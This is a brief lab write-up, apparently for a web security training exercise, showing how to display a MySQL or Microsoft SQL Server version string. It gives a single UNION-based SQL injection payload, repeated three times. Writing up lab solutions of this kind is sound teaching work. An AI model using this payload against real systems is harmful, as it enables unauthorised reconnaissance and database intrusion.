# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft (Practitioner)

**Goal:** Display the database version string.

## Solution

**MySQL / Microsoft SQL Server:**

```
' UNION SELECT @@version, NULL--
```

Or for Microsoft:

```
' UNION SELECT @@version, NULL--
```

(Works on both in most labs.)

## Payload

```
' UNION SELECT @@version, NULL--
```
